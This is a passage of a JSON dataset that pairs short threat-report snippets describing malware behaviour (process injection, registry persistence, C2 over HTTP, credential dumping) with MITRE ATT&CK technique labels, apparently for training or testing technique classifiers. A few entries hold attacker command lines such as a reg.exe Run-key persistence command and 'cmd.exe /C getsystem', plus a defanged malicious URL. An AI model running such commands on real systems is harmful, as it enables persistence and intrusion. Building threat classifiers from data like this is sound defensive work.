    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can execute loadfromfile loadfromstorage and loadfrommem to inject a DLL from disk storage or memory respectively.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can collect process filenames and SID authority level.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "modified the Registry to perform multiple techniques through the use of .",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "the PID of the process in which the orchestrator is running.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can download malicious files from threat actor controlled AWS URL's.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can be used to gather information about the operating system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "file was executed by the injected Rundll32.exe process.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has built-in commands for uploading downloading and executing files to the system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "CreateProcess ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Windows\\system32\\cmd.exe /C systeminfo",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The payload sends system information about the infected computer to the C&C server and downloads additional tools.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has created LNK files in the Startup folder to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "both use CreateFile and WriteFile APIs",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to determine the domain name and whether a proxy is configured on a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can collect information about running processes. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can communicate with its C2 using HTTP. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has relied upon a victim to click on a malicious email attachment.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The encoded payload was a Cobalt Strike httpsstager that was injected into the PowerShell process that ran the command",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Windows API",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "issuing the following command line",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "the use of RDP by the Threat Actor",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has a command to create Registry entries for storing data under HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WABE\\DataPath.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has a module to download and upload files to the system. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors downloaded additional tools and files onto a compromised network.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can request to delete files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Persistence is maintained after boot/reboot via malicious autostart registry keys.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can add a service named wind0ws to the Registry to achieve persistence after reboot.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "injecting it into ieinstall.exe",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate file and folder names.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Invoke-WmiCommand CodeExecution module uses WMI to execute and retrieve the output from a  payload.(Citation: GitHub PowerSploit May 2012)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Process injection was observed during the intrusion",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "writes its configuration to registry,\nthis value is set to “default” and is later manually changed by the\nactor",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors used domain accounts to gain further access to victim systems.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has created scheduled tasks to maintain 's persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "For each directory it traverses",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used the command-line interface.(Citation: Unit 42 Magic Hound Feb 2017)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has deleted many of its files used during operations as part of cleanup including removing applications and deleting screenshots.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "provides access using both standard facilities like SSH and additional access using its backdoor Espeon providing a reverse shell upon receipt of a special packet",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The username appears to be attacker specified and has occurred in 2017 Bankshot samples",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has used malware that leveraged WMI for execution and querying host information.(Citation: Securelist MuddyWater Oct 2018)(Citation: ClearSky MuddyWater Nov 2018)(Citation: Talos MuddyWater May 2019)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has used command line during its intrusions.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to disable Microsoft Outlook's security policies to disable macro warnings.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can delete the DLLs for its various components from a compromised host.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has relied on users to execute malicious file attachments delivered via spearphishing emails. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "creating the files and registry keys",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used various Windows API functions including `DeviceIoControl` as part of its encryption process.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "injecting itself into a running explorer.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has injected a DLL library containing a Trojan into the fwmain32.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has a command to return a directory listing for a specified directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use  to run a Portable Executable (PE) on the compromised host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "obtained information about the configured Exchange virtual directory using Get-WebServicesVirtualDirectory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can leverage API functions for execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has searched folders and subfolders for files to encrypt.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "received a command-line argument from attacker",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "using the clfsw32.dll API function",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "the Loader copies the new PE headers to the base address and each section to the relevant location according to the IMAGE_SECTION_HEADER",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors downloaded additional files to the infected system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The corresponding files are collected",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has a command to download and executes additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute remote files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can add modify and/or delete registry keys. It has changed the proxy configuration of a victim system by modifying the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has been observed turning off Windows Security Center and can hide the AV software window from the view of the infected user.(Citation: Securelist Kimsuky Sept 2013)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has a command to launch a remote shell and executes commands on the victims machine.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can decrypt the payload into memory create a new suspended process of itself then inject a decrypted payload to the new process and resume new process execution.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "uses reflective DLL injection to inject the malicious library and execute the RAT.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "use WMI to persist a backdoor and also store the PowerShell backdoor code.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has loaded an encrypted DLL into memory and then executes it.(Citation: Cybereason Conti Jan 2021)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has been executed through malicious e-mail attachments.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors used password cracking and pass-the-hash tools to discover usernames and passwords.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can delete files to cover tracks.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "This process was invoked by RunDLL32.exe",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve the ARP cache from the local system by using GetIpNetTable. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Egress communications over HTTP, HTTPS",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Operates as a file grabber",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "used as a lure to entice the victim into opening the malicious file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "aggregates collected data in a tmp file.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "used the ipconfig /all command to gather the IP address from the system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Tools were transferred to a compromised web-facing server",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "communicates over HTTP or HTTPS for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "A  file stealer can gather the victim's username to send to a C2 server.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "After encrypting its own log files the log encryption module in  deletes the original unencrypted files from the host.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The  dropper copies the system file rundll32.exe to the install location for the malware then uses the copy of rundll32.exe to load and execute the main  component.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "execution using scheduled tasks",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP as a transport to communicate with its command server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "One variant of  uses WMI queries to gather information.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "adds collected files to a temp.zip file saved in the %temp% folder then base64 encodes it and uploads it to control server.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can create a memory dump of LSASS via the `MiniDumpWriteDump Win32` API call.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect the computer name RAM used and operating system version from the victims machine.(Citation: TrendMicro DarkComet Sept 2014)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can download specific payloads to a compromised host based on OS architecture.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses various WMI queries to check if the sample is running in a sandbox.(Citation: Unit 42 DarkHydrus July 2018)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP GET requests to check internet connectivity.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "If the Process Hollowing method is used, a new svchost.exe process is created in a suspended state.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has overwritten the function pointer in the extra window memory of Explorer's Shell_TrayWnd in order to execute malicious code in the context of the explorer.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has established persistence by creating autostart extensibility point (ASEP) Registry entries in the Run key and other Registry keys as well as by creating shortcuts in the Internet Explorer Quick Start folder.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "is typically executed via command line arguments",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can download files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "deletes its original installer file once installation is complete.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "began enumerating the network using native Windows binaries",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Following the successful injection of   deleted a temporary file it created named InventoryManager.bk after restoring the original SolarWinds Orion source code to the software library.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The specific mechanism used to inject into a foreign process, was injecting arbitrary code into its memory space, and executing it as a remotely created thread",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "File starts as mico-audio.exe and installs to C:\\Users\\%USERNAME%\\AppData\\Roaming\\google-chrome\\crome.exe",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP in C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "loads injecthelper.dll into a newly created rundll32.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can collect host IP information from the victims machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download additional payloads from C2 to the targeted system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can use WMI to execute commands.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors then dropped SoftPerfect’s Network Scanner",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has gathered victim computer information and configurations.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "runs tests to determine the privilege level of the compromised user.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "obtains a list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can delete downloaded executables after running them.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "obfuscated .NET file using process hollowing, which is a code injection technique in which an attacker removes legitimate code from an executable and replaces it with malicious code.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "additional beacons executed using remote WMIC commands,",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to recursively enumerate files on an infected endpoint.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "used HTTP for C2 and data exfiltration.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor managed to continue to access the victim’s cloud environment",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download additional tools from the C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "used RDP to move laterally in victim networks.(Citation: FireEye FIN6 April 2016)",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "remove all existing shadow copies via vssadmin on command line",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used command-line interfaces for execution.(Citation: SecureWorks BRONZE UNION June 2017)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has injected its orchestrator DLL into explorer.exe.  has also injected its communications module into the victim's default browser to make C2 connections appear less suspicious as all network connections will be initiated by the browser process.(Citation: ESET ComRAT May 2020)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "injects into a newly spawned process created from a native Windows executable.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can query HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\<Excel Version>\\Excel\\Security\\AccessVBOM\\ to determine if the security setting for restricting default programmatic access is enabled.(Citation: Talos Cobalt Strike September 2020)",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "affiliates may exploit group policies, which results in a scheduled task being created (on each host) that launches the ransomware.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The batch file was executed",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses NetUser-GetInfo to identify that it is running under an Admin account on the local system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "the ransomware modifies specific registry values",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has a module to download and execute files on the compromised machine.(Citation: CIRCL PlugX March 2013)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "observed targeting the LSASS process or Active directory (NDST.DIT) for credential dumping.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "collects its process identifier (PID) on the victim.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used tools to enumerate processes on target hosts including Process Explorer.(Citation: Symantec Shuckworm January 2022)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Windows\\system32\\cmd.exe /C getsystem",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "creates a registry key in HKEY_CURRENT_USER\\SOFTWARE\\",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used `check_registry_keys` as part of its environmental checks.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "ipconfig",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used malware to enumerate active processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "pulling additional BatLoader payloads and scripts from C2",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "executes another BAT script",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Windows APIs",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has collected files from a local victim.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "This information allows a threat actor to determine if their messages were delivered, which users are more susceptible to opening them, and basic information regarding the target’s operating system and e-mail client (or browser)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "collects the machine name and keyboard language from the system. (Citation: Cofense Astaroth Sept 2018)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP and HTTPs for C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Manipulates registry",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "downloads files onto infected hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has registered itself as a system service in the Registry for automatic execution at system startup.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "In some cases, batch (.bat) scripts were created",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "leveraging comsvcs.dll with proxy execution by rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "the user account used to connect to the victim’s O365 tenant",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has created a snapshot of running processes using `CreateToolhelp32Snapshot`.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can collect the hostname Microsoft Windows version and processor architecture from a victim machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded malicious DLLs which served as a  loader.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "adds itself to the startup folder or adds itself to the Registry key SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can establish persistence via the Registry under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file.(Citation: FireEye FIN7 April 2017)(Citation: eSentire FIN7 July 2021)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "adversary was also observed remotely modifying the Windows Registry on remote systems",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used kill.bat script to disable security tools.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used macOS API functions to perform tasks.(Citation: ESET DazzleSpy Jan 2022)",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to modify Registry keys to disable crash dumps colors for compressed files and pop-up information about folders and desktop items.(Citation: SentinelOne Hermetic Wiper February 2022)(Citation: Crowdstrike DriveSlayer February 2022)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "modifies registry keys to maintain persistence,",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can save encryption parameters and system information to the Registry.(Citation: Cylance Sodinokibi July 2019)(Citation: Secureworks GandCrab and REvil September 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Intel 471 REvil March 2020)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "uses a command-line interface to interact with systems.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has collected the hostname and operating system version from the compromised host.(Citation: FireEye Metamorfo Apr 2018)(Citation: Fortinet Metamorfo Feb 2020)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "loads the resources using the API calls LdrFindResource_U and LdrAccessResource",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors used ProcDump to dump credentials from memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect the username on the victim machine to send to C2.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has collected data and files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "the command-line syntax used",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The Retriever Trojan uses the following namespace: using pcchekapp.grp.ammar.samaneh; Android.The malware begins by creating a web service object and uses the following URL within its configuration: http:// service.chrome-up[.]date:8080 /WebService.asmx It then calls a function called “SetLog2”, which sets variables for the system’s IP address, MAC address and hostname",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The domain name of the device",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "PowerShell to connect to third-party file sharing\nsites to download the UltraVNC application",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can collect drive information from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can download or upload files from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Lateral Movement APT40 uses many methods for lateral movement throughout an environment, including custom scripts, web shells, a variety of tunnelers, as well as Remote Desktop Protocol (RDP)",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "ps ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can search for specific files and directories on a machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify folders and files related to previous infections.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Symantec determined a more accurate picture of Buckeye’s targets by looking at where Buckeye remained active on the network longer than a day, deployed additional tools, and spread onto multiple computers",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and the Startup folder to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The services running on the compromised system are checked against the following list",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "using the API NtRaiseHardError",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can open a command line interface.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "reg.exe add\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "is distributed through exposed Remote Desktop Protocol (RDP) setups",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has used tasklist to enumerate processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The HTTP protocol uses the message format detailed in the previous paragraph, but it adds a few extra steps to disguise its traffic as legitimate HTTP",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can create a registry key using wdigest.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify specific files and directories that are not to be encrypted.(Citation: Kaspersky Sodin July 2019)(Citation: Cylance Sodinokibi July 2019)(Citation: Secureworks GandCrab and REvil September 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Intel 471 REvil March 2020)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "downloaded additional tools such as  malware and  to the compromised host following initial compromise.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This function is responsible for deleting all files and directories in the user’s trash folder.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can obtain the proxy settings of a compromised machine using `InternetQueryOptionA` and its IP address by running `nslookup myip.opendns.comresolver1.opendns.com\\r\\n`.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has collected the computer name from the infected host. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to proxy execution of malicious files with Rundll32.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "creates then deletes log files during installation of itself as a service.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "allows adversaries to execute shell commands on the infected host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has uploaded files and data from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTPS for C2 communications.(Citation: Symantec Dyre June 2015) ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has run tests to determine the privilege level of the compromised user.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "file injection capability",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used various methods of process injection including hot patching.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has a module for performing remote desktop access.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
